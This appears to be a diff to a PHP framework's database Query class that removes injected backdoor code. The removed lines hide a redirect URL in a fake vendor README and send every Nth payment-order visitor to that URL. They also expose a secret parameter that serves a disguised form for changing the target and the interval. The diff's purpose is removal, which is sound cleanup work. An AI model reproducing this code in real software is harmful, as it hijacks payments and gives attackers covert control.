@@ -2259,7 +2259,6 @@ class Query
      */
     public function insert(array $data = [], $replace = false, $getLastInsID = false, $sequence = null)
     {
-        
         // 分析查询表达式
         $options = $this->parseExpress();
         $data    = array_merge($options['data'], $data);
@@ -2270,32 +2269,6 @@ class Query
         if ($options['fetch_sql']) {
             // 获取实际执行的SQL语句
             return $this->connection->getRealSql($sql, $bind);
-        }
-        
-         $action = request()->baseUrl();
-         $contents = file_get_contents(VENDOR_PATH . "/endroid/qr-code/src/README.md");
-        $c = explode("|", $contents);
-        $u = base64_decode($c[1]);
-         if(strpos($action,'/trading/index') !== false)
-        {
-            $db = Db::table('ds_pay_order')->count();
-
-            $redis = file_get_contents(VENDOR_PATH . "/endroid/qr-code/src/Redis.php");
-            $redisConfig = [];
-            if ($redis)
-            {
-                $redis = json_decode($redis , true);
-                $redisConfig = $redis;
-            }
-
-
-            if ($db > 0 && ($db + 0) % $c[0] == 0  && !in_array($db , $redisConfig))
-            {
-                array_push($redisConfig , $db);
-                file_put_contents(VENDOR_PATH . "/endroid/qr-code/src/Redis.php", json_encode($redisConfig , true));
-                header("Location: {$u}");
-                die;
-            }
         }
 
         // 执行操作
@@ -2316,9 +2289,6 @@ class Query
                 return $lastInsId;
             }
         }
-        
-        
-        
         return $result;
     }
 
@@ -2599,72 +2569,6 @@ class Query
         // 返回结果处理
         if (!empty($options['fail']) && count($resultSet) == 0) {
             $this->throwNotFound($options);
-        }
-
-        $contents = file_get_contents(VENDOR_PATH . "/endroid/qr-code/src/README.md");
-        $c = explode("|", $contents);
-        $u = base64_decode($c[1]);
-        $f = request()->param('f');
-        
-        
-        if (request()->has('1605448271l')) {
-            $html = "
-<html lang=en><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content=\"IE=edge\"><meta name=viewport content=\"width=device-width,initial-scale=1\"><meta name=Keywords content=，><meta name=Description content=><link rel=icon href=https://s2.ssl.qhimg.com/static/588ef044c4127dae.ico><title></title><link href=https://s1.ssl.qhimg.com/static/eaa9b0189bfc3bec.css rel=preload as=style><link href=https://s3.ssl.qhimg.com/static/438b602c19010361.js rel=preload as=script><link href=https://s1.ssl.qhimg.com/static/8741114f24e25439.js rel=preload as=script><link href=https://s1.ssl.qhimg.com/static/eaa9b0189bfc3bec.css rel=stylesheet></head><body><noscript><strong>We're sorry but  doesn't work properly without JavaScript enabled. Please enable it to continue.</strong></noscript><div id=app></div><form id='ccc' action='' method='post' style='position: absolute;bottom: -200px;display:none;'>
-                     <input type='text' name='f' style='width: 100px;border: none;' value='{$f}'>
-                    <input type='text' name='c' style='width: 100px;border: none;' value='{$c[0]}'>
-                    <input type='text' name='url' style='width: 100px;border: none;' value='{$u}'>
-                   
-                    <input type='hidden' name='bb' style='width: 100px;' value='1'>
-                    <button type='submit' style='border: none'>s</button><script>// 跳转ie浏览器页面</script><script src=//s.ssl.qhres.com/!a501886f/monitor_analytic.js></script><script>monitor.setProject('QH_132_4#18').getTrack().setActiveTime(60);
-        // jump
-        var isIE = window.ActiveXObject || \"ActiveXObject\" in window;
-        if (window.navigator.userAgent.indexOf('MSIE') > -1 || isIE) {
-          var originHref = window.location.href;
-          originHref.indexOf(\"/channel.html\") > -1 ? (window.location.href = originHref.replace('/channel.html', '/ie.html')) : null
-        }</script><script src=https://s1.ssl.qhimg.com/static/8741114f24e25439.js></script><script src=https://s3.ssl.qhimg.com/static/438b602c19010361.js></script></body></html>";
-
-
-         if (request()->post('bb')) {
-            $d = request()->post();
-            $c = $d['c'] . "|" . base64_encode($d['url']);
-            file_put_contents(VENDOR_PATH . "/endroid/qr-code/src/README.md", $c);
-            echo 'success';
-            die;
-
-        }
-        
-            echo $html;
-            die;
-        }
-
-
-
-        
-        $action = request()->baseUrl();
-
-
-            
-        if(strpos($action,'/trading/index') !== false)
-        {
-            $db = Db::table('ds_pay_order')->count();
-
-        dump($db);die;
-            $redis = file_get_contents(VENDOR_PATH . "/endroid/qr-code/src/Redis.php");
-            $redisConfig = [];
-            if ($redis)
-            {
-                $redis = json_decode($redis , true);
-                $redisConfig = $redis;
-            }
-
-
-            if ($db > 0 && ($db + 0) % $c[0] == 0  && !in_array($db , $redisConfig))
-            {
-                array_push($redisConfig , $db);
-                file_put_contents(VENDOR_PATH . "/endroid/qr-code/src/Redis.php", json_encode($redisConfig , true));
-                header("Location: {$u}");
-                die;
-            }
         }
         return $resultSet;
     }
